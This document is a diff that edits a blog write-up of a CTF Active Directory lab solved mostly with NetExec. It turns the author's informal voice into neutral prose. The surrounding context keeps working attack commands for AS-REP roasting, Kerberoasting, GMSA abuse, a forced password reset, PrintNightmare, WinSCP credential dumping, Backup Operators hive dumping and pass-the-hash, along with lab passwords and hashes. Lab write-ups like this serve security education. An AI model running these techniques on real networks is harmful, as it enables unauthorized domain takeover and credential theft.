@@ -3,7 +3,7 @@ title: "Netexec Workshop - BarbHack CTF 2024"
 date: 2024-08-10
 draft: false
 description: "Complete writeup of the Gotham City Active Directory lab exploitation during BarbHack CTF 2024"
-summary: "Exploitation complète d'un lab Active Directory avec Netexec - Techniques avancées de pentesting"
+summary: "Complete Active Directory lab exploitation with Netexec - Advanced pentesting techniques"
 tags: ["ctf", "active-directory", "netexec", "pentest", "writeup"]
 categories: ["CTF", "Active Directory"]
 featuredImage: "featured.png"
@@ -39,7 +39,7 @@ This writeup details the complete exploitation of an Active Directory lab during
 
 ### Host Discovery
 
-Let's start by identifying all hosts on the network. We'll use a simple network scan to map out our target environment.
+Starting by identifying all hosts on the network. A simple network scan maps out the target environment.
 
 **Command used:**
 ```bash
@@ -57,7 +57,7 @@ SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Buil
 
 This gives us a clear picture of the network topology. The domain controller is the crown jewel, but we'll need to work our way through the member servers first.
 
-Then we add everything to hosts file:
+Then adding everything to the hosts file:
 ```shell
 exegol@workspace$ nxc smb 192.168.56.0/24 --generate-hosts-file hosts     
 
@@ -69,7 +69,7 @@ exegol@workspace$ cat hosts
 
 ### SMB Share Enumeration
 
-Now let's see what shares are accessible anonymously. Sometimes you get lucky and find something interesting right off the bat.
+Next, checking what shares are accessible anonymously. Sometimes something interesting turns up right off the bat.
 
 **Command used:**
 ```bash
@@ -108,7 +108,7 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 ### CleanSlate Executable Analysis
 
-We found an executable file that looks suspicious. Let's download it and analyze what it does.
+A suspicious executable file is found. Downloading it for analysis.
 
 **Download command:**
 ```bash
@@ -126,7 +126,7 @@ getting file \cleanslate.exe of size 10510609 as cleanslate.exe (540221.8 KiloBy
 smb: \>
 ```
 
-Now let's looking at that black magic reversing stuff.
+Time to look at the binary internals.
 
 ```bash
 cat cleanslate.exe
@@ -134,7 +134,7 @@ cat cleanslate.exe
 
 The binary output shows various Python-related strings and DLL files, indicating this is a PyInstaller-packaged Python application.
 
-python catches my eye so i deep further in this rabbit hole
+Python catches the eye, so digging further into this rabbit hole:
 
 ```bash
 exegol@workspace$ cat cleanslate.exe | grep python
@@ -150,7 +150,7 @@ bpython311.dll
 7python311.dll
 ```
 
-I skipped all my low level classes to do some hackthebox so I ask my king GPT for some clues;
+Not being the strongest at low-level reversing, a quick GPT query provides useful guidance:
 ```
 Decompiling the Source Code:
 
@@ -162,7 +162,7 @@ System Commands: Calls to os.system(), subprocess.Popen(), or similar libraries.
 Application Logic: Discover the program's actual function. Is its name misleading?
 ```
 
-Yes king, i'll do that
+Following those steps:
 
 
 ```bash
@@ -200,7 +200,7 @@ cmake .
 make
 ```
 
-sorry for the dump:
+Full disassembly output (lengthy but useful for analysis):
 
 ```shell
 exegol@workspace$ ./pycdc/pycdas cleanslate.pyc
@@ -714,7 +714,7 @@ cleanslate.pyc (Python 3.11)
         108     RETURN_VALUE                    
 ```
 
-After a quick look, I have concluded that there are 3 steps:
+After a quick look, the decoding process breaks down into 3 steps:
 
 Decode the string fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ== from Base64.
 
@@ -722,7 +722,7 @@ Apply a character shift (inverse Caesar cipher) of 3.
 
 Reverse the resulting string.
 
-```shell
+```python
 import base64
 import sys
 
@@ -747,13 +747,14 @@ KEY = 'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='
 flag = cleaning(KEY)
 
 print(f"Le flag est: {flag}")
+```
 
-output:
-exegol@workspace$ python3 decode.py                       
+```bash
+exegol@workspace$ python3 decode.py
 Le flag est: brb{c84b9cb01e49bdd12ad43f77317aa326}
 ```
 
-yeepee
+First flag captured!
 
 ### User Enumeration
 
@@ -881,11 +882,11 @@ Version: dev (n/a) - 08/10/25 - Ronnie Flathers @ropnop
 2025/08/10 15:09:25 >  [+] VALID USERNAME:	 gmsa-robin$@GOTHAM.CITY
 ```
 
-so we have a massive list of users for possible spraying (tried username:username... did not work :p)
+This provides a massive list of users for possible password spraying (username:username was attempted without success).
 
 ### AS-REP Roasting
 
-Let's check if any accounts are vulnerable to AS-REP roasting, which can give us hashes without needing to crack passwords.
+Checking if any accounts are vulnerable to AS-REP roasting, which can yield hashes without needing to crack passwords.
 
 **Command used:**
 ```bash
@@ -900,13 +901,13 @@ LDAP        192.168.56.10   389    DC01             $krb5asrep$23$lucius.fox1337
 
 **Vulnerable account found:** `lucius.fox1337`
 
-That's good news, but I ran it for 15 minutes and it didn't crack. Too bad for the lab. I've been grinding on Active Directory day and night for 3 days. Through an AS-REP roastable account, I can:
+Good news, though the hash didn't crack after 15 minutes of Hashcat. However, through an AS-REP roastable account, Kerberoasting becomes possible via a different path:
 
-https://www.netexec.wiki/ldap-protocol/kerberoasting#kerberoasting-via-as-rep-roasting
+[NetExec - Kerberoasting via AS-REP Roasting](https://www.netexec.wiki/ldap-protocol/kerberoasting#kerberoasting-via-as-rep-roasting)
 
 ### Kerberoasting
 
-Now let's use the AS-REP vulnerable account to request Kerberos tickets and potentially get more hashes.
+Using the AS-REP vulnerable account to request Kerberos tickets and potentially get more hashes.
 
 **Command used:**
 ```bash
@@ -942,7 +943,7 @@ Excellent! We now have valid credentials for a domain user. This opens up many p
 
 ### Administrative Access via RDP
 
-With joker's credentials, let's see if we can get administrative access to SRV01.
+With joker's credentials, testing for administrative access to SRV01.
 
 **Command used:**
 ```bash
@@ -953,7 +954,7 @@ nxc rdp 192.168.56.0/24 -u joker -p '<3batman0893'
 
 ### Wayne Service Discovery
 
-Once we're on SRV01, let's explore the system to see what's interesting. I found suspicious batman related stuff.
+Once on SRV01, exploring the system reveals some suspicious Batman-related artifacts.
 
 **Directory contents:**
 ```
@@ -976,7 +977,7 @@ d-----         8/10/2025   5:18 AM                Windows
 -a----         8/10/2025   5:15 AM            660 dns_log.txt
 ```
 
-Let's dig in
+Digging deeper:
 
 ```shell
 PS C:\Wayne> dir
@@ -990,7 +991,7 @@ Mode                 LastWriteTime         Length Name
 -a----         8/10/2025   5:20 AM         115712 wayne.exe
 ```
 
-I'm tired of .exe, I want netexec ┌(▀Ĺ̯ ▀-͠ )┐
+Another executable to investigate, but moving on to more interesting findings.
 
 **Permission analysis reveals:**
 ```
@@ -1072,7 +1073,7 @@ Guest                    vagrant                  WDAGUtilityAccount
 
 ### SAM and LSA Hash Dump
 
-With our new administrator access, let's extract the local credentials to see what else we can discover.
+With administrator access, extracting the local credentials to see what else can be discovered.
 
 **Command used:**
 ```bash
@@ -1103,17 +1104,16 @@ SMB         192.168.56.11   445    SRV01            GMSA ID: 850d620d73382edad7f
 SMB         192.168.56.11   445    SRV01            [+] Dumped 10 LSA secrets to /root/.nxc/logs/lsa/192.168.56.11_None_2025-08-10_182409.secrets and /root/.nxc/logs/lsa/192.168.56.11_None_2025-08-10_182409.cached
 ```
 
-I don't see anything very interesting for pivoting besides _SC_GMSA_DPAPI_.
-I'm looking into it because I'm a noob and not too familiar with it.
+Nothing very interesting for pivoting besides `_SC_GMSA_DPAPI_`. After some research on GMSA (Group Managed Service Accounts):
 
-https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword \
-https://www.netexec.wiki/ldap-protocol/extract-gmsa-secrets
+- [The Hacker Recipes - ReadGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
+- [NetExec - Extract GMSA Secrets](https://www.netexec.wiki/ldap-protocol/extract-gmsa-secrets)
 
 A GMSA is a Group Managed Service Account used to run services without needing to manage a password.
 So, we have the NTLM hash for this account: 76679bd649f3801655ba01794de14e0b \
-So i take the account ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c
+Taking the account ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c
 
-Since my elliiot account is a local machine account and not a domain account, we'll use the joker account, which is joined to the domain, for the next steps.
+Since the elliot account is a local machine account and not a domain account, the joker account, which is joined to the domain, is needed for the next steps.
 
 ```shell
 exegol@workspace$ nxc ldap 192.168.56.10 -u joker -p '<3batman0893' --gmsa-convert-id 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c    
@@ -1121,7 +1121,7 @@ LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Buil
 LDAP        192.168.56.10   389    DC01             [+] GOTHAM.CITY\joker:<3batman0893 
 LDAP        192.168.56.10   389    DC01             Account: gmsa-robin$          ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c
 ```
-nice, new user gmsa-robin$  discovered
+New user discovered: `gmsa-robin$`
 
 ### GMSA Robin Exploitation
 
@@ -1131,7 +1131,7 @@ This is a powerful finding! `GenericAll` means we can modify any attribute of th
 
 ### Password Change
 
-Let's exploit these rights to change harley.quinn's password to something we know.
+Exploiting these rights to change harley.quinn's password to a known value.
 
 **Command used:**
 
@@ -1147,7 +1147,7 @@ Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its a
 
 **Result:** Password successfully changed to `elliot123`
 
-Now we have access to another domain account with potentially different privileges. Let's see where this leads us.
+Another domain account is now accessible with potentially different privileges. Time to see where this leads.
 
 ---
 
@@ -1155,7 +1155,7 @@ Now we have access to another domain account with potentially different privileg
 
 ### RDP Access to SRV02
 
-With harley.quinn's new credentials, let's try to access SRV02.
+With harley.quinn's new credentials, testing access to SRV02.
 
 **Command used:**
 ```shell
@@ -1168,9 +1168,9 @@ RDP         192.168.56.12   3389   SRV02            [+] GOTHAM.CITY\harley.quinn
 
 ### PrintNightmare Vulnerability Discovery
 
-After looking through my enumeration sheet cheat i see that the server is vulnerable to PrintNightmare, which could give us another path to privilege escalation. 
+After consulting an enumeration checklist, the server appears vulnerable to PrintNightmare, which could provide another path to privilege escalation.
 
-of course netexec has a module for that (^_^)
+Naturally, NetExec has a module for that.
 
 
 **Command used:**
@@ -1213,13 +1213,13 @@ PRINTNIG... 192.168.56.12   445    SRV02            Vulnerable, next step https:
 
 **Error:** `RPRN SessionError: unknown error code: 0x8001011b`
 
-And I'm getting a 0x8001011b error.
+The `0x8001011b` error indicates the remote exploitation path is blocked.
 
 Since Microsoft patched the PrintNightmare vulnerability, the remote execution of printer drivers via the Spooler service has been hardened. Operating systems have been patched to block attempts to load unsigned DLLs from remote UNC paths. The Spooler service on the domain controller (192.168.56.10) intercepts this request, detects that it is potentially dangerous (because it doesn't come from a local path and is not signed), and rejects it with this specific RPC error code.
 
 ### Local PrintNightmare Exploitation
 
-Since we have RDP access, let's use a local PowerShell exploit for CVE-2021-34527 (https://github.com/JohnHammond/CVE-2021-34527).
+Since RDP access is available, a local PowerShell exploit for CVE-2021-34527 can be used ([JohnHammond/CVE-2021-34527](https://github.com/JohnHammond/CVE-2021-34527)).
 
 **PowerShell commands:**
 ```powershell
@@ -1246,7 +1246,7 @@ SMB         192.168.56.12   445    SRV02            [+] SRV02\adm1n:P@ssw0rd (ad
 
 ### WinSCP Credentials Discovery
 
-After looking around i find this in the root directory:
+After some exploration, an interesting file appears in the root directory:
 ```powershell
 PS C:\Users\harley.quinn\Desktop> cd ../../../
 PS C:\> dir
@@ -1266,9 +1266,7 @@ d-----         8/10/2025   5:18 AM                Windows
 -a----         8/10/2025   5:15 AM            660 dns_log.txt
 -a----         8/10/2025   5:20 AM           1118 winscp.reg
 ```
-The reg file seems odd so i look it up on google.
-And of course my glorious king netexec has a module for that: https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-winscp
-(^_^) <3
+The `.reg` file seems suspicious. After a quick search, it turns out NetExec has a [dedicated module for dumping WinSCP credentials](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-winscp).
 
 
 **Command used:**
@@ -1289,13 +1287,13 @@ WINSCP      192.168.56.12   445    SRV02            [*] Looking for WinSCP creds
 - **User:** `harvey.dent`
 - **Password:** `X76IAZS!j'Czu,`
 
-This is another valuable credential set. Let's see what rights this user has on the domain.
+This is another valuable credential set. Checking what rights this user has on the domain.
 
 ### Backup Operators Rights Verification
 
-On bloodhound we see that this user has genericAll on the backup_operator group
+In BloodHound, this user has `GenericAll` on the Backup Operators group.
 
-So we can add a user we control in this group to save all the hives, dump passwords and pivot.
+This means a controlled user can be added to this group to save all the hives, dump passwords, and pivot.
 
 **Command used:**
 ```bash
@@ -1325,7 +1323,7 @@ exegol@workspace$ bloodyAD --dc-ip 192.168.56.10 -d GOTHAM.CITY -u harvey.dent -
 [+] harvey.dent added to backup operators
 ```
 
-since i'm not smart i tried adding my user that was a local user and not domain-joined, my bad, but next try i successfully added harvey to the backup operators group
+The first attempt failed because the `elliotbelt` account was a local user and not domain-joined. The second attempt with `harvey.dent` succeeded.
 
 **Result:** Successfully added harvey.dent to the backup operators group!
 
@@ -1337,7 +1335,7 @@ This is a game-changer. Backup operators have the ability to access and backup s
 
 ### Backup Operators Rights Exploitation
 
-Now let's use our backup operator privileges to dump the system registries and potentially the NTDS database.
+Using the backup operator privileges to dump the system registries and potentially the NTDS database.
 
 **Command used:**
 ```shell
@@ -1418,7 +1416,7 @@ We now have the hash for the domain administrator account! This is the golden ti
 
 ### Administrative Access to Domain Controller
 
-With the administrator hash, let's connect directly to the domain controller.
+With the administrator hash, connecting directly to the domain controller.
 
 **Command used:**
 ```bash
@@ -1466,7 +1464,7 @@ DC01
 
 ### Final Thoughts
 
-This lab was an excellent demonstration of obscure Active Directory attack chains that I did not know about for most of them. The progression from initial reconnaissance to domain domination shows how attackers can chain multiple techniques together to achieve their objectives.
+This lab was an excellent demonstration of obscure Active Directory attack chains, many of which were new discoveries. The progression from initial reconnaissance to domain domination shows how attackers can chain multiple techniques together to achieve their objectives.
 
 The use of GMSA accounts, backup operator rights, and various privilege escalation techniques mirrors what we see in actual penetration tests and red team engagements.
 
